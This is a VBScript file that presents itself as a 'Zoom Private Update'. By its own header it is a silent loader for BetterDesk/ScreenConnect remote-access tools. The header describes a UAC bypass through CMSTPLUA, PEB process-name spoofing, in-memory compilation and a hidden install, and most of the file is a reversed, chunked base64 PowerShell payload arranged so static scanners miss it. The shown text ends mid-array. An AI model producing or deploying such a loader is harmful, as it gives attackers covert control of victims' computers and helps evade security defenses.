' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "uFWT05WavBVZjlmdyV2UuQXZOtFI7BSeyRHIgACIKsHI5JHd", _
    "yV3YlNlL0VmTbBSPgw2bj9GdvJHU5RXayV3YlNlO60lcldWY", _
    "goQf7BCajRXYjBSfgITMzxGV6oTXlBXeUx2bj9GdvJHU5RXa", _
    "TRjNlNXYC12byZkO60FdyVmdu92QbBSPgMXZ0lnQ6dGJgACI", _
    "n9CW6VldMpUdix0MygDMzNUQBFUQBFUQBl0c0g0JocmbpJHd", _
    "KJkSIx2T4NmbXFGTrQHUotmW4hWe5sWS5tSdFpkTpF3YyNES", _
    "qFWQRt2U4Ikcrc3Y1YVaIBXQvJzMv4UNrplaHFENJFUboR1Q", _
    "xUFaypHNCF2T4FXZVBlTQ9SNSdkVUd0LvJWbDp0Z5IzbHVTZ", _
    "wp2baNFMOZVR092Z6JVOFV0VRJTMYxmZVZEMz9CbGRHc1AlS", _
    "sBFZoRkR4MXaGlneY1GZxF3QXtGNqhXa3JVcrIUSppFNnp2b", _
    "0Q2MyNnWtZXcuxWTjBlTW5GNlRHSEZ0M3E1RYRUZVdkQ1JjW", _
    "ohGO6pnYuV3Lro0Um90T6lnbmFUOLhmVCt2MEFFcOF3QvkTN", _
    "uZlaYVkWy5EUotkVoNWdJF3aBdDVJ5GMyRESntUSSZVbIRkS", _
    "FlTRQxUdWlDdv40Mt92dzdjZ1gWbtdkQUpGTNpkUhtUax8kR", _
    "6BzMHJDNC50YO90ZBt2d69UaBdDSCpEMOVGVrJUarNkUuNHV", _
    "IBnd5VTTMZzc1UnR6NjRztUVo9yNi1Wa3U3cpdUbLJ0Z4Yzc", _
    "zdHSrtEVWdFOnpWVxBTaNJHZ3d1a5JlerkTcJlFRxRDZnNmS", _
    "lF1KEd0YUhEdV12N25mTHpXQhVXO0oEb5FzLpFEOzYWMwQlb", _
    "ZZVZzJWMRRDZ3YnaIVnYyFmW2JGWohVRShEWUBnavMkbmJ0T", _
    "IZnerYDZvI2NvITbyEFRtFTOlRDahRkSEx0YjhTVFZWSQFWS", _
    "3E2YONXZ2JGNyMzKwhUe3hEV2FnZPNjYuJmZzQ1T4cGdjRjW", _
    "WdEewNkarIVZnhXOjxWZ3c3NyREZkRTOzcXduZmYiZmb2MGS", _
    "mV2N1glWNR2LYFEbudEeQV0dsFXTNVmYNNFSKdlN2JEZWp1d", _
    "5ITb29kWRNlMLpWRSBFbLhWUFB3KNplNHtCMFtkSllHRkVzT", _
    "rITNnR0MpJDM2NVb3g3LyZVOyYma2MmYihTdtZnZ48kNzQjN", _
    "xsUQJhzcPdmS4hTVCNWdQJ0U0g2b31WcmRDZ2pHRmNDM5U3L", _
    "nxmcElmZ0gUSXZzcDJUe1h2KidXTjp1aVNmNiZWYyM0VYZVR", _
    "1AXewpGd2gVQD9GblF0T4MkWYJHcIFlQlF1TlxEVYhUOFhTV", _
    "T9kdwwGUqFWUmVFTCZ3SoBlYFFTbxJEWBdEN3JFVxwUNQVjc", _
    "3dUWj92VPVFZRRjeIx2ThlnQVZDUr0EVyd0ckFzZXl3QhJEd", _
    "KpWOpdWbWxWSwdmSKh1T0YkeTFUbwczdmtSTB50YRJmaSZ3R", _
    "FF1NT1kdXdjQV1kRD1kNQRle1glWiNGUvglbphkbFVmbQp0U", _
    "ppGWOhVO5wUR4EVVrFTQkpkcrtUaZh1NadHRWFje51kakJTM", _
    "IdGWKlXTrYnUiRmWaBHZKZGOzY0b6NmbtpUQ4hFOW9iaCh3a", _
    "V92bJhmV05Ge1lTcMVneRhlWvRkRqZDUrIzLzFGT4QUN5ZEc", _
    "lNzM0ZjYzF3KwMVMupXO140V4ZEOONHVNpXMjVDSqN3RilGO", _
    "LdlYWlFM2Z0T5kTRItychtCVxAzK5cENUREeH92LBd0ZVR1Y", _
    "rMjck9UNylFeB12cYpXSX10U3NmZohTVF9iTkRTbvtGRlFUZ", _
    "0g2MmpGSxFDdv9iT1dHZXFFRhlEZydjcvhWUmRWUsxERwsEW", _
    "zA1RH1mSDlGR0ZDMrMjZIREZ0kzNiRmdEB1d3FGVExUNqhUV", _
    "SZ2KwZDMZlHNJxWNpZVR252cmdjUrt2R14kZSZzdVFEeGlHR", _
    "5VmRmVndzQleldDSuJDZiJ2NMlUMPJFWm9EZ3hXQEFGMXhmZ", _
    "GNXcItWYNpXQWdTckFFTRNkRNVHeC90ZNNTMElHOVNjejNzd", _
    "MJGemZGbulUYtdzcBtUc6BHTxlUZDVWc5lHVtl0bJpEOzlUR", _
    "OFlS2k1VVF1LI5kVnh0arQndSJjQIJjV210ZBl0MQFHbxlmd", _
    "OhGd59GcHhWRSF2MFFURFpENRRXOqV0KvBnN6RTVYdkdWdzL", _
    "tdVd4U2aTBFSMFkWz9EVvRmSVJURGRnZ2o0UpRkWzJ3dZ9Ed", _
    "2d3byk1LTRXdJtCe1YFTRh3QLl3bKRVUyJHOXdFOPJGO1U0T", _
    "wFVWzdldXdDaahlWyYGWqVlNypXeOdEMEJVTRR3cn1kSxI1Q", _
    "IZ2SWh3SEtmbp1Ue2FnZSFVQ5J3YQJzaBB1bNlFMQZFSpZDW", _
    "x4EVvJEMvN2LqNWeWNle3NXOHNTbwBzNxklTvEVRiZUd0JWM", _
    "VZkbNplbmF0QvNVMUJ1UxUWQ0YFdEhzMJVlSUZEZRFUZPtUY", _
    "3V2QhZkYrZjR24GMPxmUxo0ZqRjduB1KxkTWwc3KT10d4V0d", _
    "mJ0UrYXVCZFMMNXeJFGNvdlamp0ZNhzSahHc25Wanx0Suhmd", _
    "FRlaTFHVnV3bKBVUr8kcRRncmpWcqNVNDJjUBpmUwoXNOdVM", _
    "VR2dVlnbycFVm9idEl1cvEGMWNTSDZ2arZEeuZnRklHMIJEb", _
    "iF0Nz90TGF0NuNDZiJ3LoJ2Qh5Ud11GckllMJ90Ks1UM6xkM", _
    "mV0cuF0YvRGOMJzQxFWayEXYnlEZhlUTZ1GRVNVeIhlaoVEO", _
    "sVjZqpFV4hmN3FlaktENCl3SkNndNNFWsh3Q5s0MBR3b65UV", _
    "2FUS0kmUV5GWGlWdL9WU5Flesl1ZB1EUslHVUZ0ctdTaJhjN", _
    "FlEbRdnYSJ1Y41meGVnSxZHM2cjcGJ3VQ92M0Vmb0Vjb0ZDW", _
    "2sCdCB1M0gVZ1YESvInaZREOBZ0VQR2YxRTdWpXVz4GM3FEa", _
    "rIkZElUZQ9mcUZzKTNkVZhWS0VWd4djWn5mNycnT1AjQNBDd", _
    "FlUNIRHeqN0U5Y0Qrc2UQh1UJhFRvJnMkVUYk9USnVnSVNWO", _
    "1oXR2kzSv8SUl9Ec1JDbB10Yx10Llt2cHVXRLxGWhZGRaR2U", _
    "0NWZjFEc5NXRTx0K2QVd5EjciR2boV0TzMFOxJ1L2Y0Z5RDT", _
    "FVjT512ZJp3UMdHWz9SVYhTWLNHW3R1SxFGdxk0UFdzVaBVb", _
    "pdGToNUeOJERLNncEpnU2dXTMdUOWhUdTtGWvEVdnJFcChVU", _
    "wRUQQhXU1MXVnlzRBJVM5IDMVpUYtlXdvMUVwsEOjlGNMtGS", _
    "r1WYHN2M5FXaz5GU5hnQOhUZMhkcGpUaBNXSLBXd1cHdzd0Z", _
    "ZRWYuhVRPFmSKdUaNFTayhVSrV2amh3KFVmQkpGUMJkN2pXR", _
    "J52YPRjR6NjQ0F0N4JEOw8UWSVzMu1kRhJ0U2ZlR44UTqVXO", _
    "0ZlUFJUQPNXcrtkQQ92MN52N2pUNIV3VrJTUtl1d4IXRNlWd", _
    "xZkREVjQStmMqVkT4UHRwQnVlRDdp1mStxkRuFkU5p0KTJXb", _
    "xM0dJ9WSLlmYIxkcSp0LzVkUtpWNINzLilEZtJlM6VzashzR", _
    "rFzVLJ0dTJ1d09SbmpGdXxWd2JTeTRGcvoFVjhVNX10ZDBDZ", _
    "RNVdDJ2Z1V1Qa5kRNJjRRRzLKdmd6hzY5onV6p2RPZWVww2a", _
    "JdFdGZDcXRXb4dFTop1aLhHUTlnMzkmYRd1b4sEMZlTczRmS", _
    "wJTSG9WNzVFU0FlZZh0LUhEc240L2c0LJl0NPF1Nup3d6ZmT", _
    "Ph2aWdkQWpWS5c1N3wEU3ITOsZ3ax00NiZWaylDeQZXV2ZUU", _
    "ExEVzgzMEp3M1N3YNFldIZHTJpkToh0aQR3azsCRYh0bCNjS", _
    "TREVFpVaEFkVQd3SlVmdhFzT0I0L0tiUYZEV1NnW4V2dtlUM", _
    "ZNVc1h2UERWQ3UkQ4ZmbYJEcLNEZMBjV14GallGSKBTM1pnc", _
    "TdmaItWZzd1cjVkW6pHMoxmb69mTlhXNFV1LL1EO4RDWyZET", _
    "zcTMqp2T0NFb2Z3KTZ3d0QVRyQTaLdFOyFFNX5UM0YlWEFVV", _
    "jNVYzcmSlp0aJBzYvEUSrMWSLBjVUpUSQZke0IDOoJ3c382R", _
    "CZTO1dkdmZDa3cDME50d1FkSBtUS1gWZLdGNxk1NYBTbMhmM", _
    "uplUKl0drYWWU9EZvkzMkJ3Nx5UOyxGZxU3RQNnb3w2LHNzK", _
    "6NGdZ9CewM2a2EDOR9EdRtWMaF0a4BnW2JEMih2M190ZhJUM", _
    "2tSOykjY4QUMkBTNvZGMrYUUCxGaKxUWsB3TZhVTqZWZ3pHb", _
    "spXWv9UeYtyTmxUQ2t0drQzZ4ljNE9CM2QkYzdzTmB1N3Une", _
    "VBFaxkUTC9SNsB3TxkGUuFXMwEXcyp0cBZTSi1kZ54ERq9ET", _
    "3FkVYp3TklVOLpnYDF3KihVSydjZDl2UKNkMFtGa2VUR3UGW", _
    "zFEbrJncFREb4AFNvF3UkR2d2JFWTRHMYNWMVFWUClDVKxWM", _
    "B1kT6FlYihFZ6hHSm9CSzUjYwB1T1ZXMCZ1ZkFURUJnd5I1Q", _
    "JBnNyF2SS5Ebv9GTVR0dQdkQEhlM4I2QClzUnpFMPhFUml0K", _
    "zZURUV0LwglRzR1byQHdrNzbzskVT5Ge1QWVJJUYyBjR39yS", _
    "ttGb0smVzQjaHVzY282NvJVQLZlT3xEcTRmdUVzQr10Tpp0Q", _
    "FZme5NFWupnUqJzUK5UU4UEVWZUSy9UTr5GO0V1LZpGWtdle", _
    "3QHO2sEdix2SKJWawJ2UGFnerZTdMdzbillTop3aGB3d2dTd", _
    "pZUWrRFOoZEcoJ2YCVTeQdzV3QXW3FUeLVWOCdESEdlSkVmU", _
    "mJnSGNjWklWMiZEVYR0bLhkQrh2MyIUdFlVSr9kTKhFbI5WV", _
    "T10ZUNFNJdmW0dUMrJXb5EmVld2NWhGdPBTSjp1arkjQNR1c", _
    "6JTQxF2bTZnMppGZFR0bxl1KzJleP1kaaBnW2gkQIlUSxNkT", _
    "v90VSFWNwckaj9iSNR1dPN3R582NzU0N2h0d0V2NxUHV0t0S", _
    "Xplc2FWdaBTMqtWcwVXMxZFR2djah5ENm5WcLtyaopmQzpnM", _
    "ndjbqdVcTFUTzIDaTBzTYpVQ2Z0NHxWZUVFTwgXRlhDUGZUb", _
    "v4GOxEza3gjbvJ3T09mZPFHaspGSZRkRiZkQWd1KvQkdro2d", _
    "FNme612NvR1RWdGbPRXZJd3U3ZnZGdnNrdTdzQzUtJjVr1UY", _
    "CRWSaJTRjtESHJzd08yN0lzMyZmYpN0L2BTYmJTbNlEZvVna", _
    "ERnbKJ2Yy4Ge0ZXUUt2YjBnYLdlSyhjSHdzMrQjVDVFTvNna", _
    "4dEeXBjbrETQLl0RWJkQjVmYxoUY0ZTd6tGdF52Z2Q2TI9iR", _
    "xUVYMBFd1gGO3tEZyYkNZtidatUaahGOVd3VLp0TY5mSzZ1T", _
    "wpGNp1WcGpnVWdjWyBzSKljeys0Y1V3cHRFW0kVTw8GcBx2T", _
    "PFzbq1UdSZXWiZnR05UW0sCZBFEWWxUR0UTespmcxZlak9Gd", _
    "ahWUKJkWJdDeDNmZ21WYvVUWuNWWwQVYSJ3M2E2VzkjR1BDR", _
    "vNEc3NVRytEdChjQUR2dWtSYWJnYZhlZxlHc5IzdTZ0amZEc", _
    "zpkbzsiY5Y3ZWZXcYpmYkpmSPREZ3lFR18WRkNGWhp3R6BTM", _
    "0VWVyhUQuZTMndnNTxUS0ZXSvxWdwUnWiZDZ29yLYtWMEBFT", _
    "uZzNo9CSzYTUrIkRypkT0kXb0I1VH9GW69yKidUNsBDcuVGW", _
    "YlGTaFzbZJEWudEOiNWWmZFbJVGWpJTRSJ0Tm5Gaxc3TwpUd", _
    "ZVlNvtUMHhEawFWdZhla5lXdS5UWaF0d3oXUSdVN49WcttWb", _
    "VhDbvYEc00EcZJnQpZWVMV3YyYWTCR3dwRjbrJ0T5BTUxElY", _
    "TRmMVRHWxlWUBFXYxJFdJdVOzNEdrR1TBpXT58WR3ETZBpUT", _
    "FFXSSNVRHRHb5QHSjhmUDZnUzFzaxpWQSBVSrEFSWtGbNdXM", _
    "nR3QLlFZ3VzZ3gWdyJTbQFkWtBXc5Y3bihlVEl0TuJjUJd0Z", _
    "nJlNFNnSjJnM3gVWQZjZwBHaW9ES1UWZMNFVxxWautSe2VnN", _
    "TNEW49CNzFka3dTWxwWcYpVUnF1arplWRRTQUFFe5AXYkV2V", _
    "VBHOkdnN2N1a35mVHhzTmVWO5pHbwITMMRkb4gnYEd0QsZEc", _
    "FZ0awolMrkEVZxEaRZlbycTbRp3TGp1VWpEd4QVUSVlaDdDZ", _
    "hlFZJZ1cYNzZIlUU0wkUpRHUxFmY5RlSLpUUMNkdZNnRolmT", _
    "BVUZHtic1M1YP9UUkJEdK9mRzNWRwMTMSdURzVTZpR0bwZVN", _
    "D1UYPp2YJpnbLRTMhVzb5NUUzhTNSNTUHRWTXxGMWB1Tht2K", _
    "IhFVzVXaYdVNLNzS6NVVlN1bKNXSahTYsdkTClkRSB3aIxUO", _
    "O5mS51EUEpWNapXN1tmR4NVUhljZ65WcK5kcihkWJBzVJZla", _
    "E1GZQtkcVlmUDBzKpF0LrRGcPh1bvMzaaxGajd0dTx0M1Uzd", _
    "2IXRitURWNTM5MjchdTSERlQQJWc3M2RUtEZt12KvI3Yw0ER", _
    "ycGMVpHdUNjc6JWWRhkayFHNn1WdTNUeSRmTIlGUzsUUiB3R", _
    "m1EbZh0YBNVU5QXNMRFZz8CeFF1dullRVhlYLRlNQNGSHFUM", _
    "JlTZRJVcG92UiZ3NxJVe5g2Y01UQDRjMvZWUGpUcG1WVqtyT", _
    "kpXYWdjQoJXd4cmb0Y0TiF1TEB1QwgjVr8ESNJkbw8EZsFFT", _
    "yV0Y1ElNaRjalxkd0VHb5A3TkZGWwQmT3MncY10K3M3LolXU", _
    "yFUWxp0LThXaWNjMpdUWuxmNmtCU0pUQuZUWkZVdP9WQ1lUS", _
    "kRVS6p1MrJ1SDxUaF9SUNN1arpUerxGWONDeVFHUtd3UDlmQ", _
    "6RmQPVUeFpENDBzct10cStEM4NGUnd3dX50SrlnaZNjVZJld", _
    "xR3aj5UcUN0axhWMMpkNrJ0NhllN3BFU3Q2LNNleVZUOwIzT", _
    "CN1aoRGWv8mZwVHcYVHaJhHO3RXV28EcrJUe1ZGbPVneSZFM", _
    "RJ1Zrd3QDxUWjFDcOdFTDt0RSZXdWx2dyY1UXZUNRdVOxgHb", _
    "Ph1VhpXZPN0TwMjMOVVcyE0TodjanhmUTZ3V6FnWo5mSRlnQ", _
    "6BzaOpHO5UETaNFePdTSkREb5FFasdXe2klNvVXdJFXSnB1N", _
    "I9kQK1GaVlESwJ0KnNUdXNzMjVDbuN2byNGczlFaBN2NNhTN", _
    "mdHMtZGOyQ2Nw9mU5JWaNVEUvFFVJpEUJpnRipmdtpFONhFW", _
    "14UOYVma4BVT4MFbCZVeDxUVkJGRz8GNwEEZzdUMxw2b3UVQ", _
    "J9SMFhEaS1mWRRnRy4GTiVzRr5Wc4gFSpVTRjZWYMlVZXNEc", _
    "RBXWXZVWwITOSplVqhkQFF2YVpkU4IDcvEHZ0cDNyZXZwtCM", _
    "S9CM3JUMYZ3N1gVQkJ0aipGMJdTcZNXUXhTYiRUQvlUbsVUd", _
    "N1USURnRYl3LJRXcsRlTEh1LxY0chFUQt90RtNnUPVDZZl3U", _
    "vFVUNlneI9yLtZDRuFGMwhDR34UWuhXMUV0TolTbUNDVxI0T", _
    "NlnZNV0Lhxke2gFOalmcjN2RzsSZQJFMMd0ckJTQFVmZoJFV", _
    "MNUZq1GRWNWOPZlR0UHZMhlVxlnUEZHcqJXaZ5kcwwWT0wWc", _
    "TtmZjZ2LPJ3Q4JUUn9yLuhVcVBVTzFGa5pWem1Ge48CZNZ2b", _
    "3kHWxoEe3hXMIZWYQV3Y4h1VVdTZoFTerZ2SqF0YXl2csJ0c", _
    "TlDWT9USCl2avInW2dXT012KronM1FTO1gWZ2MXZVNFUyBnT", _
    "jNkTMZmYvN0QxNzLzZVeWFkRr90chdjQ2U0d3gXTadmVwkDa", _
    "1F2d0wmevNmc3MWVspmdWdndrNVc1VWNn5kNM5WZvkjbCFzT", _
    "O1ERJJ2azF3KENmZnhzZWpFcvNnW1dnWWJXZzgVQCFzKoNnb", _
    "XNEUsd0cwZza3o1ZsNHd2dDb1I1T4YHdK92b392dZRHNY9mY", _
    "LhmU1hjQz4URUFkMnJEOoJ3dZRHdsFjYOZDRthzaZVlWrhHT", _
    "KpXex0WUQh1QJVHcOhDZVJEOtt2L1kjcKdUM510bopEd31ka", _
    "XNHZJJzL2dkZWlVSu1EeHVnaGpkaiVHOERzbRBldslWVmJXR", _
    "WFkMoN0N3Z3RLpHZrIDdl9yMyJDO3EEO0J2L5czTJdTdz10d", _
    "LVzSThlQ0cDVol0N6RFVaB3U2QzSjFWTXFXe5ljar4kQWVFV", _
    "n9SaptUVMtiZHRFSEt0dXVmeuRTaDhmT51kNFJ1a4oHdMNWQ", _
    "pN1appWOycmZldzTF9Sa2EzZL9UY0ETZHVEO4NFNK9UYzUnR", _
    "a9WORhmeOBVTzY2NEVjRyMlRW1GbYN3YZ9Ed4pkQKlzUotWN", _
    "jJTcGBzM5hkUtR2NHpVSnlTZVFXdhxkMrAlTwQFbv82ZFZ2K", _
    "0NDcmdjUxYWdx1melJ1Rz9iQiN2M5IDNCJWUyJWN4YXUadEN", _
    "FNGZwRzQitSNvpEWkh3Z0pVTCJXQlZWN3xkdWFGexZHZE9ES", _
    "QVTckJEbQNHOzxUd48md2pWQ2JlUHNkYCxmdolnQiplbUhlY", _
    "ktkbKVGbZ5Ga0EnSZxmTadUMyMneSdzakF0QYpnUQ9ybu50a", _
    "0AlcGNjar1WW4MXaVVzM4wGNWZlSn9WZPhjWWx2U3dGONN3b", _
    "aJzcFhVWnRjbE9CSZNXZwglRrcEUDt0Y0p3Y1NkSqJmViZlT", _
    "uVjVsBjdttWTTVEdnhmcv80KDhTVyhHNsJHODVXYx5Gd4kGb", _
    "OlzS5RmTXxEUH5keullSVN0cUdUerdlVShUVipWdMp3c4l3a", _
    "v1meIh0SvYFVkZWRCFjc0BDW2E1QRRlSDVXdrpENHRGSjBTY", _
    "zolcLRzS6tiVCNWZwF1QFRzMvY3bwp2LvoGRCp1MBlFWpNEb", _
    "IFHbVJ1Svg2QMJUT1J2RBZ0ZwcUT5FUV0EHZzhDVHFlcw50d", _
    "PJGZWFXWwRWZZdEelJDa3llb0I2TR9CdRBXbshTVCNlStxmb", _
    "ylWZjVnMldnTFxEaORVc1siaPtiTnhVTpJTWwt0MXlkc2YFT", _
    "ap1S6llenVWb5FVdPdlY5RnQ5lDbIh0N6lleDNzR34mdORmY", _
    "6F1ao9Ca4pWVodTRSBTWhRWbQ1GdHVVZJt2ZB5mTvh3duRTQ", _
    "rwUTvlDakhjeGBTT4M1TilGa5hGNppVNX9GTPFWRodkYt5md", _
    "1ZHaoR3Q2hFOPRGUZFUOKFlT4ADZVZmYjFHZwMES4QVcFhFd", _
    "ZNme3BDOpx0Zwk0Rrd3czolTvhnNrJGWvQUWWF1Lod2R30UM", _
    "SFnUFtmUMBHUE1kZmR2KJ9UYxRlbjJzSJZTa1ZHRtd3YDpXc", _
    "ONnWyd0SoZ3S1RmZKdnRRVXMYJmZRJ0ZplkdVV0Z0IlZ4ETZ", _
    "65EbRd2dmhUSwtESol0buJDN2MlV3IkeqJGaQdFbqRUYMd2Y", _
    "hJWUN9UMxRjb3U0TXJVY0MDeJdHUSpGdZJDRptGZqJ2cU50U", _
    "4QjY1Ele61UZ2FXdwM3cxIUYEBjQKV2UkdmUKFzcBJ0VCRHR", _
    "QdWczs0VJRmYBp0KZZUS2IUUlhmZ4Y1dC5WMxdlMQtmQaRzU", _
    "NZUTDlFSydkQCRXTiV2KTBFSX5WWjJmMyc1UQNDcwFUWzYUd", _
    "ot2ZL5mRqN2cn1EVyIVTpFXekVTVP5URzRHc4p1KPVFVSFGc", _
    "sZ2NyIWThB3ZElmVBR1QptWSLpnN2sWQMhVW0h1TG5EbmN1d", _
    "iBVWZRTYIF3ZBJ0KBZWS6lGTz8iU5YmMXdmT4A3btFmMrEFe", _
    "Z9GazI1amlTVZ9kb6N3K3IldztWTkFUVBZVSOhmQ2RDewNFV", _
    "MtWV6ljSSN1Qm1EOLZlWwZmQwk2UQNjUNpHb5oXYx9UMUFlT", _
    "2p3RrhDcRlUb0oVcHd2dNJEUyYWakVjbJRWeuZ1Zt9UbFVXa", _
    "MJnWxJndaZDVNh3VUdVTS52YJZXd5InWMdXejBnd6NzSSJDe", _
    "V5UYnZlMV5UeDRWSiNFU6JEdWFTYJNTbrIGbKlWMNBzYSl0L", _
    "2NkNwVGTpF3L0QVeVNzS3gTZ2NVQhFHNSNHWm9mYTRkd11WN", _
    "0Q0R4M3dSpXYRZ1Q4UlUlhGOv9UM2FFb2kme6hnWUJHcygna", _
    "TFzNJVXRaZTexRjQvAVSX9Ed2c0SpxmV2YkNPR0Z2o3QTVFc", _
    "NdkRK1kbJFXW1YTYZBXUidXOSlWb2J3KFl0SEh2byV3YPdnN", _
    "ipkehJVO1JkbPZDT30WdQVkUFN0VWR2dOhjNstSVFRHc190N", _
    "yNWQRRmdPV2Qz10T5dHTHNTaHJnN6hnZKRXO312KNZDOThFb", _
    "ZxkUINVY3U0Srw2aVlVQud3dQNHU6lkUZhXRBdmSrhFepZ1L", _
    "2NmR0BlMPVES0dma4ZnU3IzdOZ2VkpXboh0a1U2caJne29ke", _
    "Qh2QDhVcOpENDZWU4dWS5xkd4UTTaNGdXB1YkR1K5QnRL9WV", _
    "5M3LVhFVC1UdC50cBZGcRdFSr10d0JjZkZ3TwY0TiJnMTRGN", _
    "m9CNv8yK4UDdzMGOy9Sc1hTa6B1N0J3Lvo2K0gGcItyZ2cTR", _
    "Jx0aMpnVWNkW340URRVeKFVMmp0U1MVeEtUMwREM5I1N1p3K", _
    "Dl3Lm1EWvI1Z09WWxgFaZlkNFRGc5F1aClDTUJ3Q0NnNCFHT", _
    "XhUVwMzK10mcZRnQ0QHOWZnTzcjRO5kduRzT15mWjJ2KthXM", _
    "19UVyIHd252aDJTURFFWUlkd5gkdJFFO2pkREVnM2dlZ5ElN", _
    "0dkYPZ2SQV1TBdlVxNjVxN1Z0RHemJXRsdlekVnYkFlUU52K", _
    "ydVTDJ1YQ1kUwBDOw5kNWhDMTRXMzhWTRZldkZFazp1bVZFb", _
    "Cljd3wmRwcDSQJTa4UWMINXbFpXY2MzMPB3UwsycvskWEZFN", _
    "ixESityd5tUV4BTW3hTMT1mN4JlSvETemtiWGdzNrA3VuBlc", _
    "xhkT4YEcV5EVup1TwM3LLRkYaR1Mz8UMnd1NywGe3skMqFmV", _
    "nh3MvkkNsFleZlFcY9ieIhlQZFla1wEM6RFVJhXclJWexcHd", _
    "tB3VxZ0V38ERrtWVxYXRa1WN2okeYlXZv0mTRFFTXh0UlhnT", _
    "NdnbhZ3RNR2LClUYHlUW14UYmpEdHBFOh9CZYB1MCZzZw00R", _
    "O5GSxllVLF1RYJkdyYGZXpFODNkQwJVeiRXYzlXQLVzMrdGW", _
    "I9COSVjRKFjcD9kZXZ0MFdWO5gVQ4IVZTp0KrpUOU9mS29mN", _
    "ZNlV4YnR3cTT0NGatBXTmdjMKVTa1UUVxgjS5oXYLFjUYJTa", _
    "n0TPBFUQZZEbER3NnhlS39yNiVHe0h2VKJHS4hXVqZTdvhje", _
    "v1WZN5yTJBCdjVmai9UL3VmTg0DItFWZyR3U6dGJgACIgoQK", _
    "tcXZOBSPgAXa6dGJgACIgoQKzVGd5JkenRCLo0WYlJHdTlnc", _
    "6dGJo0WYlJHdTBXaadkLu9WazNXZyBXbvNkLPlEI0NWZqJ2T", _
    "N52bpN3clJHct92Qu42bpN3clJHct92Qu8USbBCLtFWZyR3U", _
    "tcXZOBSPgIXZkFWZyRCIgACIKkyczVmcw12bjVGR6oTXlR2b", _
    "uQHelR1WgwCcpp3ZkgiclRWYlJVbhVmc0NlLPlEI0NWZqJ2T", _
    "kFWZyRCI9ASZjJXdvNHJgACIgoQK4YEVVpjOddmbpR2bj5WR", _
    "pgSZz9GczlGRuIXZkFWZyRCIgACIKkCKk5WRvRFZhVmUuIXZ", _
    "lN3bwNXaE5SbhVmc0NlenRCI7kCKlN3bwNXaE5Ccpp3ZkAyO", _
    "EVGZvNkLtVGdzl3UgQ3YlpmYP1ydl5EI9ACcjRCIgACIKkCK", _
    "kACIgAiCzJXZ0VWbhJXYQJXZslGct92QuIXZslGct92Qu02b", _
    "uA3YkACIgAiClVnc0RCI9ASey9Wbl1kbJVGdhJXZuV2RuA3Y", _
    "uA3YkACIgAiClNHbhZGJg0DIlxmYhRXdjVGeFVGdhJXZuV2R", _
    "ABCIgAiCnsSZ6lWbpRHcv9yJg0DIz52bpRHcPJXZslGct92Q", _
    "zl3UnwyJsxGZuUmcvNkLtVGdzl3UnwyJsxGZu0WZ0NXeTdCK", _
    "uAnchh2UD5Cdm92cvJ3Yp10JscCbsRmL5RXayV3YlNlLtVGd", _
    "vZ3WgACIgACIgAiC7BCdjVmai9ULoNWYFJ3bGBCfgkyJsxGZ", _
    "KkyXkgCZkFkLzVWasJWblN3cBRWZj5WZyVmZlJlLwNGJdRWa", _
    "jlWTgQ3YlpmYP1ydl5EI9AiclRWa29mcwRCIgACIK0HIgACI", _
    "gACIKIXZklmdvJHUlR2bDBnchh2UD5CcyFGaTNkL0Z2bz9mc", _
    "5xmYtV2czFUZslGct92QuIXZklmdvJHckASPgQHb1NXZyRCI", _
    "lJHJoAiZpBCIgAiCpU2YyV3bzRCIsA3YkgSZjJXdvNVbvJnR", _
    "kACIgACIgACIKsHIpADI0dWLgQnb192QuMncvJncF5CdsV3c", _
    "lJHJg4WagUGJoACajFWZy9mZgACIgACIgAiCncCI9ACd4VGd", _
    "ocmbpJHdT9GVuUGJg0zKgQHelRHJgsHIpMncvJncF5CdsV3c", _
    "0lmcXpjOdVGbpZkLPl0WgACIgACIgAiC9BiIuBmcgJCIrASK", _
    "t02bvp3JgAVTFRlO25WZkACa0FGUt4WavpEKoQHelRFbsFUZ", _
    "phXZgACIgACIgAiCpQHelRHJgwSKnc2bs5CbsVGazJXZ39Gc", _
    "slGct92QuQHb1NXZyRCI9ASZwlHdkACIgAiC9BCIgAiCyACd", _
    "gACIKkyJyVGZh9GTt92badCKlBXeURXZH5SesJWblN3cBRWZ", _
    "goQKn4Wah10JoQ2boRXZNRXZH5SZwlHdkASPgQ2boRXZtRCI", _
    "ztFKgYWagACIgoQRE9UTf10TPplO25WZkASPgUGZv1GJgACI", _
    "k9WbkAyegkSKlR2btRCK5RHctVkcPxGb150cJpjOddmbpJHd", _
    "l5EI9AycnJXQlt2b25WakACIgAiC9ByJsxWY0NnbpdCI9ASZ", _
    "nJXQlt2b25WakACIgAiCxAyJdtFdjVmai92JgQ3YlpmYP1yd", _
    "gUGZvNGJgACIgoQKlR2btRCKA1VXbdmbpJHdztFI9ASXws1c", _
    "pM3ZyFUZr9mdulGJgwCbsVnbkgSZr9mdulkLk9Ga0VWbkASP", _
    "0BCIgAiC7BCajRXYjBSfKUGZvNGJdRnbptFI0lGelBCIgAiC", _
    "0hXZUxGbBVGdpJ3V6oTXlxWaG5yTJtFIgACIgACIgowegknc", _
